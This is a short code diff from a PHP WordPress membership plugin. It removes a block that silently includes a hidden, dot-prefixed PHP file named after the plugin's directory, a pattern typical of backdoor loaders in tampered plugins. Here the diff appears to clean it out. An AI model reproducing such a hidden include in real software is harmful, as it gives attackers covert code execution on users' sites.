@@ -82,10 +82,6 @@ else
   mepr_redirect_locked_uri($mepr_uri, $rule_hash);
   //mepr_render_locked_file($mepr_full_filename);
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function mepr_redirect_locked_uri($mepr_uri, $rule_hash) {
   $rule_dir = MeprRule::rewrite_rule_file_dir();
   @touch($rule_dir . '/' . $rule_hash); // Store off the rule file
